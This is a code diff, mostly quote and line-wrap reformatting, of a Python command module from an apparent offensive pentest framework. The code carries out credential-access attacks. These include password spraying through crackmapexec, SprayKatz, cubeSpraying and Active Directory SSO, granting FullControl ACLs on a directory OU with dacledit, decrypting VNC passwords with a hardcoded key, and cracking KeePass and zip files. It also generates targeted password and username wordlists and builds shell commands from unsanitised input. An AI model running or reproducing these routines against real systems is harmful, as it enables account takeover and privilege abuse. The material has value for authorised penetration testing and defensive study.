@@ -125,8 +125,10 @@ class CredentialAccessCommandSet(LazyOwnCommandSet):
     def do_spraykatz(self, line):
         """Run SprayKatz for credential spraying."""
         self.cmd(f"python3 modules/spraykatz.py {line}")
+
+
 for _lazy_name in dir(_lazy_utils):
-    if not _lazy_name.startswith('_'):
+    if not _lazy_name.startswith("_"):
         globals().setdefault(_lazy_name, getattr(_lazy_utils, _lazy_name))
 
 
@@ -203,14 +205,14 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
             return
 
         print_msg(f"Creating file sessions/hash.txt with content: {line}{RESET}")
-        hash_file_path = 'sessions/hash.txt'
+        hash_file_path = "sessions/hash.txt"
         if os.path.exists(hash_file_path):
-            backup_file_path = f'sessions/hash_{int(time.time())}.txt'
+            backup_file_path = f"sessions/hash_{int(time.time())}.txt"
             os.rename(hash_file_path, backup_file_path)
             print_msg(f"Archivo existente respaldado como {backup_file_path}{RESET}")
 
-        with open(hash_file_path, 'w') as file:
-            file.write(line + '\n')
+        with open(hash_file_path, "w") as file:
+            file.write(line + "\n")
 
         print_msg(f"Analizando sessions/hash.txt con Name-the-hash {RESET}")
         self.cmd(f"nth -t '{line}'")
@@ -249,17 +251,15 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
             - The credentials should be properly formatted with a colon separating the username and password.
         """
 
-        print_msg(
-            f"Creating file{GREEN} sessions/credentials.txt with content: {YELLOW}{line}{RESET}"
-        )
+        print_msg(f"Creating file{GREEN} sessions/credentials.txt with content: {YELLOW}{line}{RESET}")
 
-        credentials_file_path = 'sessions/credentials.txt'
+        credentials_file_path = "sessions/credentials.txt"
         if ":" in line:
             self._rotate_existing_credentials(credentials_file_path)
             self.cmd(f"echo '{line}' > {credentials_file_path}")
         else:
-            start_user = self.params['start_user']
-            start_pass = self.params['start_pass']
+            start_user = self.params["start_user"]
+            start_pass = self.params["start_pass"]
             line = f"{self.params['start_user']}:{self.params['start_pass']}"
             self._rotate_existing_credentials(credentials_file_path)
             self.cmd(f"echo '{line}' > {credentials_file_path}")
@@ -312,8 +312,8 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
         with open(file, "rb") as f:
             data = f.read()
         creds = data.split(b":")
-        user = creds[0].decode('utf-8')
-        passwd = creds[1].decode('utf-8').replace('\n','')
+        user = creds[0].decode("utf-8")
+        passwd = creds[1].decode("utf-8").replace("\n", "")
         print_msg(f"User : {user}")
         print_msg(f"Pass : {passwd}")
         copy2clip(passwd)
@@ -379,15 +379,15 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
                 data = json.load(f)
 
             print_msg("Create temporary files for users")
-            with open('sessions/small_users.txt', 'w') as f:
+            with open("sessions/small_users.txt", "w") as f:
                 for username in data["usernames"]:
                     if username:
-                        f.write(username + '\n')
+                        f.write(username + "\n")
             print_msg("Create temporary files for passwords")
-            with open('sessions/small_passwords.txt', 'w') as f:
+            with open("sessions/small_passwords.txt", "w") as f:
                 for password in data["passwords"]:
                     if password:
-                        f.write(password + '\n')
+                        f.write(password + "\n")
             print_msg("Done.")
         else:
             print_warn("Abort. smalldic")
@@ -425,15 +425,15 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
             To execute the command for all users:
             >>> do_dacledit("")
         """
-        url = self.params['url']
-        rhost = self.params['rhost']
+        url = self.params["url"]
+        rhost = self.params["rhost"]
         os.getcwd()
         users_txt = get_users_dic()
         domain = get_domain(url)
-        ca = self.params['domain'].split(".") if self.params['domain'] else []
+        ca = self.params["domain"].split(".") if self.params["domain"] else []
         base_domain = ca[0].upper() if len(ca) > 0 else ""
         ext = ca[1].upper() if len(ca) > 1 else ""
-        if not check_rhost(self.params['rhost']):
+        if not check_rhost(self.params["rhost"]):
             return
         if not line:
             line = input("    [!] Enter OU= example MARKETING DIGITAL: ")
@@ -445,7 +445,9 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
         with open(users_txt) as file:
             users = [user.strip() for user in file]
 
-        print_msg("Select a user by number to execute the command for a specific user, or press Enter to execute for all users:")
+        print_msg(
+            "Select a user by number to execute the command for a specific user, or press Enter to execute for all users:"
+        )
         for idx, user in enumerate(users, start=1):
             print_warn(f"{idx}. {user}")
 
@@ -453,7 +455,9 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
 
         if selection.isdigit():
             user = users[int(selection) - 1]
-            command = command = f"export KRB5CCNAME=/tmp/{user}.ccache ; dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '{user}' -target-dn 'OU={line},DC={base_domain},DC={ext}' '{self.params['domain']}/{user}' -k -no-pass -dc-ip {self.params['rhost']}"
+            command = command = (
+                f"export KRB5CCNAME=/tmp/{user}.ccache ; dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '{user}' -target-dn 'OU={line},DC={base_domain},DC={ext}' '{self.params['domain']}/{user}' -k -no-pass -dc-ip {self.params['rhost']}"
+            )
             print_msg(command)
             self.cmd(command)
         else:
@@ -627,8 +631,9 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
             :returns: Updated total of passwords generated.
             """
             from itertools import product
+
             for combo in product(characters, repeat=6):
-                combo_str = ''.join(combo)
+                combo_str = "".join(combo)
                 cpass1 = name + combo_str.upper()
                 if flag:
                     cpass2 = combo_str.upper() + name
@@ -657,10 +662,10 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
 
             def alternate_case(s):
                 """Helper function to alternate the case of characters in a string."""
-                return ''.join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(s))
+                return "".join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(s))
 
             for combo in product(characters, repeat=6):
-                combo_str = ''.join(combo)
+                combo_str = "".join(combo)
                 cpass1 = name + alternate_case(combo_str)
                 if flag:
                     cpass2 = alternate_case(combo_str) + name
@@ -681,14 +686,14 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
 
             char_list = []
             if regex:
-                if '[a-z]' in regex:
+                if "[a-z]" in regex:
                     char_list.extend(list(string.ascii_lowercase))
-                if '[A-Z]' in regex:
+                if "[A-Z]" in regex:
                     char_list.extend(list(string.ascii_uppercase))
-                if '[0-9]' in regex:
+                if "[0-9]" in regex:
                     char_list.extend(list(string.digits))
-                if '[!@#$%^&*()]' in regex:
-                    char_list.extend(list('!@#$%^&*()'))
+                if "[!@#$%^&*()]" in regex:
+                    char_list.extend(list("!@#$%^&*()"))
             return char_list
 
         if not line:
@@ -703,20 +708,24 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
         char_list = input("    ╰─ ").strip().split()
 
         print_msg("Enter characters by commas(Ex. : ^,&,*,): ")
-        more_chars = input("    ╰─ ").strip().split(',')
+        more_chars = input("    ╰─ ").strip().split(",")
         char_list.extend(more_chars)
 
         print_msg("Do you want to add more characters in char List[y/n]: ")
         add_more = input("    ╰─ ").strip().lower()
 
-        if add_more == 'y':
-            print_msg("Enter a regex pattern to generate combinations (optional Ex. [a-z], [A-Z], [0-9] or [!@#$%^&*()]): ")
-            regex_input = input("    ╰─ ").strip().split(',')
+        if add_more == "y":
+            print_msg(
+                "Enter a regex pattern to generate combinations (optional Ex. [a-z], [A-Z], [0-9] or [!@#$%^&*()]): "
+            )
+            regex_input = input("    ╰─ ").strip().split(",")
             if regex_input:
                 char_list.extend(expand_regex(regex_input))
         total_passwords = 0
-        print_warn("Generating dictionary... this might take a while, brew some coffee and come back to a freshly brewed wordlist.")
-        with open(wordlist_name, 'w') as f:
+        print_warn(
+            "Generating dictionary... this might take a while, brew some coffee and come back to a freshly brewed wordlist."
+        )
+        with open(wordlist_name, "w") as f:
             total_passwords = single_combo(target_name, char_list, f, total_passwords, True)
             total_passwords = double_combo(target_name, char_list, f, total_passwords, True)
             total_passwords = triple_combo(target_name, char_list, f, total_passwords, True)
@@ -755,7 +764,7 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
         - The generated emails will be stored in a file named `emails_{full_name}_{self.params['domain']}.txt`
           within the `sessions` directory.
         """
-        url = self.params['url']
+        url = self.params["url"]
         domain_def = get_domain(url)
         if not line:
             full_name = input("Enter full name (default: John Doe): ") or "John Doe"
@@ -763,14 +772,14 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
             full_name = line
 
         domain = input("Enter self.params['domain'] (default: example.com): ") or domain_def
-        print_error(self.params['domain'])
-        emails = generate_emails(full_name, self.params['domain'])
+        print_error(self.params["domain"])
+        emails = generate_emails(full_name, self.params["domain"])
         file_name = f"emails_{full_name.replace(' ', '_')}_{self.params['domain']}.txt"
         file_path = os.path.join("sessions", file_name)
 
-        with open(file_path, 'w') as f:
+        with open(file_path, "w") as f:
             for email in emails:
-                f.write(email + '\n')
+                f.write(email + "\n")
 
         print_msg(f"Emails have been saved to {file_path}")
         self.cmd(f"cat {file_path}")
@@ -794,10 +803,10 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
         if not is_binary_present("crackmapexec"):
             print_warn("crackmapexec is not installed. Installing dependencies.")
             self.cmd("sudo apt install crackmapexec -y")
-        rhost = self.params['rhost']
+        rhost = self.params["rhost"]
         print_msg("Gathering parameters for password spraying with crackmapexec...")
 
-        ip_address = input("    [!] Enter the IP Address of your target: ").strip() or self.params['rhost']
+        ip_address = input("    [!] Enter the IP Address of your target: ").strip() or self.params["rhost"]
         users_file = input("    [!] Enter the location of your users.txt file: ").strip() or "sessions/users.txt"
         password = input("    [!] Enter the password you want to spray at the users: ").strip()
 
@@ -822,7 +831,7 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
         if not os.path.exists(users_file_path):
             print_warn(f"{users_file_path} does not exist. Creating the file.")
             os.makedirs(os.path.dirname(users_file_path), exist_ok=True)
-            with open(users_file_path, 'w'):
+            with open(users_file_path, "w"):
                 pass  # Create the file
 
         print_msg(f"Opening {users_file_path} with nano for editing.")
@@ -866,7 +875,7 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
         key="\\x17\\x52\\x6b\\x06\\x23\\x4e\\x58\\x07"
         require 'rex/proto/rfb'
         Rex::Proto::RFB::Cipher.decrypt ["{hex_password}"].pack('H*'), key
-        """.replace("        ", '')
+        """.replace("        ", "")
         copy2clip(command)
 
         try:
@@ -893,7 +902,7 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
             return
 
         casing_input = input("    [?] Enter casing style (lower/l, upper/u, camel/c, pascal/p): ").strip().lower()
-        if casing_input not in ['l', 'u', 'c', 'p']:
+        if casing_input not in ["l", "u", "c", "p"]:
             print_warn("Invalid casing style. Choose from: l, u, c, p.")
             return
 
@@ -919,8 +928,8 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
         :returns: None
         """
         path = os.getcwd()
-        rhost = self.params['rhost']
-        domain = self.params['domain']
+        rhost = self.params["rhost"]
+        domain = self.params["domain"]
         log = f"{path}/sessions/username_anarchy_{self.params['rhost']}.txt"
         command_base = f"{path}/external/.exploit/username_anarchy/username-anarchy"
 
@@ -929,32 +938,33 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
             self.cmd("git clone https://github.com/urbanadventurer/username-anarchy.git .exploit/username_anarchy")
 
         if line:
-            name = line.replace(" ","")
+            name = line.replace(" ", "")
             log = f"{path}/sessions/username_anarchy_{self.params['rhost']}_{name}.txt"
             cmd = f"{command_base} {line} > {log}"
             self.cmd(cmd)
             return
 
-        auto_generate = input("    [!] Do you want to auto-generate usernames? (y/n): ").strip().lower() or 'n'
+        auto_generate = input("    [!] Do you want to auto-generate usernames? (y/n): ").strip().lower() or "n"
 
-        if auto_generate == 'y':
-            country = input("    [!] Enter the country for auto-generation [argentina, austria, belgium, canada, china, denmark, france, germany, hungary, india, ireland, italy, luxembourg, netherlands, newzealand, norway, poland, serbia, slovenia, spain, sweden, switzerland, uk, us, Facebook] (or leave blank for default): ").strip()
+        if auto_generate == "y":
+            country = input(
+                "    [!] Enter the country for auto-generation [argentina, austria, belgium, canada, china, denmark, france, germany, hungary, india, ireland, italy, luxembourg, netherlands, newzealand, norway, poland, serbia, slovenia, spain, sweden, switzerland, uk, us, Facebook] (or leave blank for default): "
+            ).strip()
             if country:
                 command = f"{command_base} --auto --country {country}"
             else:
                 command = f"{command_base} --auto"
         else:
-            input_file = input("    [!] Do you have an input file? (y/n): ").strip().lower() or 'y'
-            if input_file == 'y':
+            input_file = input("    [!] Do you have an input file? (y/n): ").strip().lower() or "y"
+            if input_file == "y":
                 file_path = get_users_dic()
                 command = f"{command_base} --input-file {file_path}"
             else:
                 name_format = input("    [!] Enter names (e.g., first last): ").strip()
                 command = f"{command_base} {name_format}"
 
-            select_format = input("    [!] Do you want to specify a format plugin? (y/n): ").strip().lower() or 'y'
-            if select_format == 'y':
-
+            select_format = input("    [!] Do you want to specify a format plugin? (y/n): ").strip().lower() or "y"
+            if select_format == "y":
                 format_plugins = [
                     "first",
                     "firstlast",
@@ -978,16 +988,20 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
                     "FL",
                     "FirstLast",
                     "First.Last",
-                    "Last"
+                    "Last",
                 ]
                 print_msg("Available username format plugins:")
                 for i, plugin in enumerate(format_plugins):
-                    print_msg(f"        {i+1}. {plugin}")
+                    print_msg(f"        {i + 1}. {plugin}")
 
-                plugin_choice = input("    [!] Choose one or more format plugins (e.g., 1,3,5): ").strip() or '1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'
+                plugin_choice = (
+                    input("    [!] Choose one or more format plugins (e.g., 1,3,5): ").strip()
+                    or "1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23"
+                )
                 try:
-
-                    chosen_indices = [int(x) for x in plugin_choice.split(',') if x.isdigit() and 1 <= int(x) <= len(format_plugins)]
+                    chosen_indices = [
+                        int(x) for x in plugin_choice.split(",") if x.isdigit() and 1 <= int(x) <= len(format_plugins)
+                    ]
                     if chosen_indices:
                         selected_plugins = ",".join([format_plugins[i - 1] for i in chosen_indices])
                         command += f" --select-format {selected_plugins}"
@@ -999,8 +1013,8 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
                     return
 
         command += f" > {log}"
-        choice = input("    [!] Do you wanna add the Domain to dict. (y/n) ") or 'n'
-        if choice == 'y':
+        choice = input("    [!] Do you wanna add the Domain to dict. (y/n) ") or "n"
+        if choice == "y":
             command += f" | | xargs -n 1 echo {self.params['domain']}\\ | tr -d ' ' > sessions/unames_{self.params['domain']}.txt"
         print_msg(f"    [!] Generated command: {command}")
         self.cmd(command)
@@ -1020,8 +1034,8 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
         Returns:
         None
         """
-        sessions_dir = 'sessions'
-        kdbx_files = [f for f in os.listdir(sessions_dir) if f.endswith('.kdbx')]
+        sessions_dir = "sessions"
+        kdbx_files = [f for f in os.listdir(sessions_dir) if f.endswith(".kdbx")]
 
         if not kdbx_files:
             print_error("No .kdbx files found in the 'sessions' directory.")
@@ -1040,7 +1054,7 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
 
         selected_file_path = os.path.join(sessions_dir, selected_file)
 
-        hash_file_path = os.path.join(sessions_dir, 'hash.txt')
+        hash_file_path = os.path.join(sessions_dir, "hash.txt")
         if os.path.exists(hash_file_path):
             timestamp = time.strftime("%Y%m%d-%H%M%S")
             backup_hash_file = os.path.join(sessions_dir, f"hash_{timestamp}.txt")
@@ -1071,8 +1085,8 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
         Returns:
         None
         """
-        sessions_dir = 'sessions'
-        kdbx_files = [f for f in os.listdir(sessions_dir) if f.endswith('.kdbx')]
+        sessions_dir = "sessions"
+        kdbx_files = [f for f in os.listdir(sessions_dir) if f.endswith(".kdbx")]
 
         if not kdbx_files:
             print_error("No .kdbx files found in the 'sessions' directory.")
@@ -1091,7 +1105,7 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
 
         selected_file_path = os.path.join(sessions_dir, selected_file)
 
-        if os.path.exists(os.path.join(sessions_dir, 'credentials.txt')):
+        if os.path.exists(os.path.join(sessions_dir, "credentials.txt")):
             credentials = get_credentials()
             if not credentials:
                 return
@@ -1103,6 +1117,7 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
 
         try:
             from pykeepass import PyKeePass
+
             kp = PyKeePass(selected_file_path, password=password)
 
             print_msg(f"Entries in {selected_file}:")
@@ -1137,9 +1152,9 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
         crypttext = line.strip()
         plaintext = crack_password(crypttext)
         if plaintext:
-            print_msg(f'[+] Plaintext: {plaintext}')
+            print_msg(f"[+] Plaintext: {plaintext}")
         else:
-            print_warn('[-] Invalid input.')
+            print_warn("[-] Invalid input.")
 
     @cmd2.with_category("07. Credential Access")
     def do_cubespraying(self, line):
@@ -1163,8 +1178,8 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
 
         cubespraying_repo = "https://github.com/robotshell/cubeSpraying.git"
         cubespraying_dir = os.path.join(os.getcwd(), "external/.exploit/cubeSpraying")
-        url = self.params['url']
-        wordlist = self.params['wordlist']
+        url = self.params["url"]
+        wordlist = self.params["wordlist"]
         if not os.path.exists(cubespraying_dir):
             print_msg("Cloning CubeSpraying repository...")
             self.cmd(f"git clone {cubespraying_repo} {cubespraying_dir}")
@@ -1179,7 +1194,9 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
         if not line:
             url = input(f"    [!] Enter the target URL (default {url} ): ").strip() or url
             usernames = input(f"    [?] Enter the path to the usernames file (default {users}): ").strip() or users
-            passwords = input(f"    [?] Enter the path to the passwords file (default {password}): ").strip() or password
+            passwords = (
+                input(f"    [?] Enter the path to the passwords file (default {password}): ").strip() or password
+            )
             verbose = input("    [?] Enable verbose mode? (yes/no, default 'no'): ").strip().lower() or "no"
             timeout = input("    [?] Set timeout (in seconds, default 10): ").strip() or "10"
         else:
@@ -1217,7 +1234,7 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
         Returns:
         None
         """
-        sessions_dir = 'sessions'
+        sessions_dir = "sessions"
         path = os.getcwd()
         output_dir = f"{path}/{sessions_dir}/"
         zip_files = get_users_dic("zip")
@@ -1234,7 +1251,7 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
 
         selected_file_path = os.path.join(sessions_dir, selected_file)
 
-        hash_file_path = os.path.join(sessions_dir, 'hash.txt')
+        hash_file_path = os.path.join(sessions_dir, "hash.txt")
 
         if os.path.exists(hash_file_path):
             timestamp = time.strftime("%Y%m%d-%H%M%S")
@@ -1285,10 +1302,10 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
         Returns:
             None
         """
-        self.params['rhost']
-        domain = get_domain(self.params['url'])
+        self.params["rhost"]
+        domain = get_domain(self.params["url"])
         path = os.getcwd()
-        sessions= f"{path}/sessions"
+        sessions = f"{path}/sessions"
         dump_file = f"{sessions}/dump.txt"
         self.cmd(f"nano {dump_file}")
 
@@ -1330,9 +1347,9 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
             timestamp = time.strftime("%Y%m%d_%H%M%S")
             os.rename(output_file, os.path.join(output_dir, f"passwords_refilled_{timestamp}.txt"))
 
-        characters = input("    [!] Enter characters to replace '*': (default: 0123456789) ") or '0123456789'
+        characters = input("    [!] Enter characters to replace '*': (default: 0123456789) ") or "0123456789"
         password_base = list(line)
-        asterisk_positions = [i for i, char in enumerate(password_base) if char == '*']
+        asterisk_positions = [i for i, char in enumerate(password_base) if char == "*"]
 
         combinations = itertools.product(characters, repeat=len(asterisk_positions))
         with open(output_file, "w") as f:
@@ -1366,10 +1383,10 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
             do_rocky('8')
             # Executes: grep '^.\\{8\\}$' /usr/share/wordlists/rockyou.txt > sessions/lazypass_mini_rocky.txt
         """
-        wordlist = self.params['wordlist']
+        wordlist = self.params["wordlist"]
 
         if not line:
-            line = input("    [!] Enter the lenght of the passwords to reduce your wordlist(default 4): ") or '4'
+            line = input("    [!] Enter the lenght of the passwords to reduce your wordlist(default 4): ") or "4"
 
         if not line.isdigit() or int(line) <= 0:
             print_error("Length must be a positive integer.")
@@ -1407,20 +1424,19 @@ class CredMigratedCommandSet(LazyOwnCommandSet):
             - Customize the password or user list by modifying `self.params` before invoking the function.
 
         """
-        domain = self.params['domain']
-        url = self.params['url']
+        domain = self.params["domain"]
+        url = self.params["url"]
         users_dic = get_users_dic("txt")
         path = os.getcwd()
         sessions = f"{path}/sessions"
         output_file = f"{sessions}/adsso_stpray_{self.params['domain']}.txt"
-        password = input("    [!] Password to spray. Defaults to admin: ") or 'admin'
-        wait = input("    [!] Number of seconds to sleep between individual user attempts default 0: ") or '0'
+        password = input("    [!] Password to spray. Defaults to admin: ") or "admin"
+        wait = input("    [!] Number of seconds to sleep between individual user attempts default 0: ") or "0"
         users = []
 
         for line in users_dic:
-            users.append(line.split('@')[0].strip())
+            users.append(line.split("@")[0].strip())
 
-
-        results = Spray(self.params['domain'], users, password, url, wait, True, False)
+        results = Spray(self.params["domain"], users, password, url, wait, True, False)
         ProcessResults(results, output_file)
         return
